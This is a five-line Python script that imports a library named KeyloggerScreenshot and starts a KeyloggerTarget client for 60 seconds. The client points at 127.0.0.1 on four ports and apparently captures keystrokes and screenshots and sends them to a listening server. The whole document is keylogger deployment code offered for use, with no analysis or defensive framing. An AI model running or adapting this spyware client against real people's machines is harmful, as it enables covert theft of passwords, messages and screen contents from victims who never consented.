import KeyloggerScreenshot as ks 

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 6319, ip, 4957, ip, 7981, ip, 2856, duration_in_seconds=60) 
key_client.start()